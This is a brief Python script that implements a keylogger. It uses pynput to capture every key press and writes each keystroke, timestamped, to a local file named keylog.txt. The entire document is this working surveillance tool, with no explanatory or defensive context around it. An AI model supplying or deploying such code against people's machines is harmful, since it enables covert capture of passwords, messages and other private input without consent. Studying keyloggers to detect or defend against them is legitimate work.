from pynput import keyboard
import logging

log_file = "keylog.txt"
logging.basicConfig(filename=log_file,level=logging.DEBUG,format="%(asctime)s: %(message)s")

def on_press(key):
    try:
        logging.info(str(key))
    except Exception as e:
        print(f'error loggin key: {e}')
        
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()